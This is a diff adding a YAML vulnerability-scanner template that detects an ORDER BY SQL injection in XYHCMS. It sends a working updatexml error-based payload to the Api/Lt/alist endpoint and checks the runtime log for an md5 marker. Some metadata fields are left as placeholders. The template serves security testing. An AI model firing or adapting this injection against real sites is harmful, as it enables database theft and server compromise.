@@ -1,0 +1,24 @@
+id: XYHCMS-orderby-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 行云海cms中ThinkPHP在处理order by排序时可利用key构造SQL语句进行注入，LtController.class.php中发现传入了orderby未进行过滤导致sql注入。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/X8-1%E8%A1%8C%E4%BA%91%E6%B5%B7-CMS-SQL?id=x8-1%e8%a1%8c%e4%ba%91%e6%b5%b7-cms-sql
+  tags: tags
+  
+variables:
+  timedate: "{{date_time('%Y_%M_%D')}}"
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20md5(1)),0x3a),1);]=1"
+      - "{{BaseURL}}/App/Runtime/Logs/Api/{{timedate}}.log"  
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b'
